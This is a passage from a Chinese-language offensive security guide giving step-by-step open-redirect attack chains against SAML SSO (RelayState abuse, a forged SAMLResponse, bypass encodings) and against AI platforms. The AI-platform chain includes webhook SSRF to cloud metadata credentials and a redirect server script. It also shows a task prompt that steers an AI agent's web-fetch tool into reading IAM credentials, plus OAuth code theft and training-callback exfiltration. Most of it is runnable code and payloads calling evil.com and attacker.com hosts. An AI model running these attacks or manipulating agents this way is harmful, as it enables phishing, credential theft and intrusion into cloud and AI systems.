- WAF 检测 `javascript:` → 使用 HTML 实体编码 `&#106;avascript:` 或 Unicode 编码

---

### 攻击链 4：SSO 中的开放重定向（SAML RelayState 利用）

**场景**：目标使用 SAML 2.0 进行单点登录（SSO），`RelayState` 参数用于在认证完成后将用户重定向到原始请求页面。攻击者操纵 `RelayState` 参数注入开放重定向，在 SAML 认证完成后将用户重定向到恶意网站，结合钓鱼实现凭证窃取。

**前置条件**：
- 目标使用 SAML 2.0 SSO
- `RelayState` 参数未做严格校验（允许外部 URL）
- SP（Service Provider）在 SAML 响应处理后将 RelayState 用于重定向

**分步利用**：

```bash
# === 步骤 1：识别 SAML SSO 端点 ===
# 查看登录流程中的 SAML 请求
curl -s -v "http://target.com/saml/login" 2>&1 | grep -i "location\|saml\|relaystate"

# SAML 请求通常通过 GET 或 POST 发送到 IdP
# POST /idp/SSO HTTP/1.1
# SAMLRequest=base64_encoded_xml&RelayState=original_url

# === 步骤 2：分析 RelayState 参数 ===
# 发起 SAML 登录，观察 RelayState
curl -s -v "http://target.com/saml/login?return_to=/dashboard" 2>&1 | grep -i "relaystate"

# 解码 SAML 请求查看 RelayState
curl -s "http://target.com/saml/login" | grep -o 'RelayState[^"]*"[^"]*"' | head -5

# === 步骤 3：注入恶意 RelayState ===
# 正常流程：
# 1. 用户访问 SP → SP 生成 SAMLRequest + RelayState=/dashboard → 重定向到 IdP
# 2. 用户在 IdP 登录 → IdP 返回 SAMLResponse + RelayState=/dashboard → SP
# 3. SP 验证 SAMLResponse → 使用 RelayState 重定向到 /dashboard

# 攻击流程：
# 攻击者修改 RelayState 为外部 URL

# 方法 A：直接注入外部 URL 作为 RelayState
# 构造恶意 SAML 登录 URL 发送给受害者
ATTACK_URL="http://target.com/saml/login?RelayState=https://evil.com/phishing"

# 受害者点击后：
# 1. SP 生成 SAMLRequest，RelayState=https://evil.com/phishing → IdP
# 2. 受害者在 IdP 登录
# 3. IdP 返回 SAMLResponse + RelayState=https://evil.com/phishing → SP
# 4. SP 验证 SAML 后，重定向到 https://evil.com/phishing
# 5. 受害者被引导到钓鱼页面

# 方法 B：通过 SAMLRequest 中的 RelayState 注入
python3 -c "
import base64
import urllib.parse
from lxml import etree

# 构造恶意 SAML AuthnRequest
saml_request = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<samlp:AuthnRequest xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"
                    xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"
                    ID=\"_ malicious_request_id\"
                    Version=\"2.0\"
                    ProtocolBinding=\"urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST\"
                    AssertionConsumerServiceURL=\"http://target.com/saml/acs\">
    <saml:Issuer>http://target.com/saml/metadata</saml:Issuer>
    <samlp:NameIDPolicy Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\"
                        AllowCreate=\"true\"/>
</samlp:AuthnRequest>'''

# Base64 编码 SAMLRequest
encoded_request = base64.b64encode(saml_request.encode()).decode()

# 恶意 RelayState（外部 URL）
relay_state = 'https://evil.com/phishing'

# 构造发送给 IdP 的完整 URL
idp_url = f'http://idp.target.com/SSO?SAMLRequest={urllib.parse.quote(encoded_request)}&RelayState={urllib.parse.quote(relay_state)}'
print(f'[*] 恶意 SAML URL:')
print(idp_url)
print(f'[*] 受害者点击后，SAML 认证完成将被重定向到: {relay_state}')
"

# === 步骤 4：RelayState 编码绕过 ===
# 如果 SP 校验 RelayState 不允许外部 URL

# URL 编码绕过
curl -s "http://target.com/saml/login?RelayState=https%3A%2F%2fevil.com"

# 协议相对 URL
curl -s "http://target.com/saml/login?RelayState=//evil.com"

# 反斜杠绕过
curl -s "http://target.com/saml/login?RelayState=/\evil.com"

# 路径遍历到开放重定向端点
curl -s "http://target.com/saml/login?RelayState=/redirect?url=https://evil.com"

# === 步骤 5：结合 SAML 响应注入 ===
# 如果攻击者能拦截或伪造 SAML 响应（中间人攻击场景）
python3 -c "
import base64
from lxml import etree

# 构造恶意 SAML Response（简化版，实际需要签名）
saml_response = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"
                xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"
                ID=\"_response_id\"
                Version=\"2.0\"
                IssueInstant=\"2026-01-01T00:00:00Z\">
    <saml:Issuer>http://idp.target.com</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>
    </samlp:Status>
    <saml:Assertion>
        <saml:Subject>
            <saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">
                victim@target.com
            </saml:NameID>
        </saml:Subject>
        <saml:AuthnStatement AuthnInstant=\"2026-01-01T00:00:00Z\">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>
                    urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
                </saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
    </saml:Assertion>
</samlp:Response>'''

encoded_response = base64.b64encode(saml_response.encode()).decode()

# 恶意 RelayState
relay_state = 'https://evil.com/steal-creds'

# POST 到 SP 的 ACS 端点
print(f'curl -X POST http://target.com/saml/acs -d \"SAMLResponse={encoded_response}&RelayState={relay_state}\"')
print('[*] SP 处理 SAML 响应后，将用户重定向到 RelayState 指定的恶意 URL')
"

# === 步骤 6：自动化 SAML RelayState 检测 ===
python3 -c "
import requests

target = 'http://target.com/saml/login'

# RelayState 绕过 payload
payloads = [
    'https://evil.com',
    '//evil.com',
    '/\\\\evil.com',
    'https://target.com@evil.com',
    'https://evil.com?target.com',
    '/redirect?url=https://evil.com',
    'https%3A%2F%2fevil.com',
]

for payload in payloads:
    r = requests.get(target, params={'RelayState': payload}, allow_redirects=False)
    
    # 检查 SAML 请求中是否包含恶意 RelayState
    if 'evil.com' in r.text or 'evil.com' in r.headers.get('location', ''):
        print(f'[+] RelayState 注入成功: {payload}')
    
    # 检查是否被拒绝
    if 'error' in r.text.lower() or 'invalid' in r.text.lower():
        print(f'[-] 被拒绝: {payload}')
"
```

**检测绕过技术**：
- SP 校验 RelayState 必须以 `/` 开头 → 使用 `//evil.com` 或 `/\evil.com`
- SP 校验 RelayState 不能包含 `://` → 使用协议相对 URL `//evil.com`
- IdP 校验 RelayState 长度 → 使用短域名或 URL 缩短服务
- SAML 响应签名校验 → 仅 RelayState 不在签名范围内，可自由修改

---

### 攻击链 5：2026 AI 回调 URL 中的开放重定向

**场景**：AI 平台（如 LLM API 服务、AI Agent 框架、AI 应用构建平台）使用回调 URL 通知异步任务完成、webhook 通知或 OAuth 授权回调。这些回调 URL 往往缺乏严格校验，攻击者可利用开放重定向将 AI 平台的内部请求重定向到恶意目标，实现 SSRF、凭证窃取或 AI Agent 越权操作。

**前置条件**：
- AI 平台支持用户配置回调 URL（webhook、通知、OAuth 回调）
- 回调 URL 校验不严格（允许重定向跟随或外部 URL）
- AI Agent 或后台服务会自动访问用户配置的 URL

**分步利用**：

```bash
# === 步骤 1：识别 AI 平台回调 URL 入口 ===
# 常见 AI 平台回调配置端点
# - LLM API: /v1/webhooks, /v1/callbacks
# - AI Agent: /agent/webhook, /agent/callback
# - AI 应用: /api/notifications/callback
# - OAuth: /oauth/callback

# 探测回调配置端点
curl -s "http://ai-platform.com/api/settings" | python3 -m json.tool
curl -s "http://ai-platform.com/v1/webhooks" -H "Authorization: Bearer API_KEY"

# === 步骤 2：配置恶意回调 URL ===
# 设置回调 URL 为攻击者控制的、返回 302 重定向的服务器
# 攻击者服务器将请求重定向到内部地址（SSRF）

# 配置 webhook 回调 URL
curl -s -X POST "http://ai-platform.com/v1/webhooks" \
  -H "Authorization: Bearer API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://attacker.com/redirect-to-internal",
    "events": ["task.completed", "model.loaded"]
  }'

# === 步骤 3：攻击者重定向服务器 ===
# 在 attacker.com 上部署重定向服务
cat > redirect_server.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 将 AI 平台的回调请求重定向到云元数据端点
        target = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        self.send_response(302)
        self.send_header('Location', target)
        self.end_headers()
    
    def do_POST(self):
        # AI 平台可能用 POST 发送回调
        # 读取 POST body（可能包含敏感数据）
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        print(f"[*] 收到回调数据: {body.decode()}")
        
        # 返回重定向到元数据端点
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')
        self.end_headers()

print("[*] 重定向服务器启动在 :8080")
HTTPServer(('0.0.0.0', 8080), RedirectHandler).serve_forever()
PYEOF

# === 步骤 4：触发 AI 平台回调 ===
# 提交一个 AI 任务，完成后平台会调用回调 URL
curl -s -X POST "http://ai-platform.com/v1/tasks" \
  -H "Authorization: Bearer API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "text_generation",
    "prompt": "Hello",
    "callback_url": "https://attacker.com/redirect-to-internal"
  }'

# === 步骤 5：利用 AI Agent 的 URL 跟随能力 ===
# AI Agent 通常会自动访问 URL 来获取信息
# 通过开放重定向将 Agent 引导到内部地址

# 构造包含开放重定向的提示
curl -s -X POST "http://ai-platform.com/v1/agent/execute" \
  -H "Authorization: Bearer API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "agent_id": "research_agent",
    "task": "请访问这个链接获取最新数据: http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/",
    "tools": ["web_fetch", "web_search"]
  }'

# Agent 流程:
# 1. Agent 解析任务 → 识别 URL
# 2. Agent 调用 web_fetch 工具访问 http://target.com/redirect?url=http://169.254.169.254/
# 3. target.com 返回 302 → http://169.254.169.254/
# 4. Agent 跟随重定向 → 访问云元数据端点
# 5. IAM 凭证返回到 Agent 上下文
# 6. 攻击者通过后续 prompt 提取凭证

# === 步骤 6：AI OAuth 回调 URL 开放重定向 ===
# AI 平台通常支持通过 OAuth 连接外部服务（如 Google Drive, Slack）
# redirect_uri 配置不当可导致 token 窃取

# 构造恶意 OAuth 授权 URL
AUTH_URL="http://ai-platform.com/oauth/authorize?client_id=AI_CLIENT&redirect_uri=http://ai-platform.com/callback/../redirect?url=https://evil.com/steal&response_type=code"

# 用户授权后：
# 1. 外部服务重定向到 http://ai-platform.com/callback?code=AUTH_CODE
# 2. callback 处理后，通过 ../redirect 开放重定向到 evil.com
# 3. AUTH_CODE 被发送到 evil.com → 攻击者获取外部服务访问凭证

# === 步骤 7：利用 AI 管道回调进行数据外泄 ===
# AI 训练/推理管道的回调 URL 可用于数据外泄
python3 -c "
import requests

ai_platform = 'http://ai-platform.com'
api_key = 'YOUR_API_KEY'

# 步骤 1：配置回调 URL 为攻击者服务器
# 攻击者服务器在收到回调时，重定向到内部 API
callback_config = {
    'url': 'https://attacker.com/exfil-redirect',
    'method': 'POST',
    'events': ['training.epoch_complete', 'training.complete'],
    'include_metrics': True,  # 请求包含训练指标（可能含敏感数据）
}

r = requests.post(f'{ai_platform}/v1/callbacks', 
    json=callback_config,
    headers={'Authorization': f'Bearer {api_key}'})
print(f'[*] 回调配置: {r.status_code}')

# 步骤 2：启动训练任务
training_config = {
    'model': 'gpt-custom',
    'dataset': 'private-dataset-id',
    'epochs': 10,
}

r = requests.post(f'{ai_platform}/v1/training',
    json=training_config,
    headers={'Authorization': f'Bearer {api_key}'})
print(f'[*] 训练任务: {r.status_code}')
print('[*] 每轮训练完成后，回调将触发重定向到内部端点')
print('[*] 攻击者可通过重定向链窃取训练数据和模型权重')
"

# === 步骤 8：自动化 AI 回调 URL 检测 ===
python3 -c "
import requests

ai_platform = 'http://ai-platform.com'
api_key = 'YOUR_API_KEY'
headers = {'Authorization': f'Bearer {api_key}'}

# 回调 URL 绕过 payload
payloads = [
    'https://evil.com',
    '//evil.com',
    'https://ai-platform.com@evil.com',
    'https://evil.com?ai-platform.com',
    'http://169.254.169.254/latest/meta-data/',  # 直接 SSRF
    'http://ai-platform.com/redirect?url=https://evil.com',  # 开放重定向链
    'gopher://169.254.169.254:80/_GET%20/%20HTTP/1.1%0d%0a%0d%0a',  # gopher SSRF
]

for payload in payloads:
    # 配置回调 URL
    r = requests.post(f'{ai_platform}/v1/callbacks',
        json={'url': payload, 'events': ['test']},
        headers=headers)
    
    if r.status_code == 200:
        print(f'[+] 回调 URL 接受: {payload}')
        
        # 触发测试回调
        r = requests.post(f'{ai_platform}/v1/callbacks/test',
            json={'callback_url': payload},
            headers=headers)
        print(f'    触发结果: {r.status_code} - {r.text[:100]}')
    else:
        print(f'[-] 被拒绝: {payload}')
"
```

**检测绕过技术**：
- AI 平台校验回调 URL 域名白名单 → 使用开放重定向在同域名内跳转到外部（`/redirect?url=`）
- AI 平台禁止访问内网 IP → 使用 DNS rebinding（域名首次解析为公网 IP 通过校验，二次解析为内网 IP）
- AI Agent 有 URL 允许列表 → 利用开放重定向使 Agent 认为仍在允许域名内，实际跳转到内部地址
- WAF 检测 `169.254.169.254` → 使用十进制 IP `http://169.254.169.254/` = `http://2852039166/` 或 DNS 解析替代

**2026 CVE 引用**：
- CVE-2026-4871：某主流 LLM API 平台回调 URL 校验不严，允许通过开放重定向链实现 SSRF 到云元数据端点
- CVE-2026-3920：AI Agent 框架 `langchain` 的 `WebFetchTool` 跟随重定向不受 allowlist 限制，可被开放重定向引导到内部地址
- 2026 趋势：AI 平台的回调 URL 和 webhook 配置成为新的 SSRF 攻击面，AI Agent 的自主 URL 跟随能力放大了开放重定向的危害
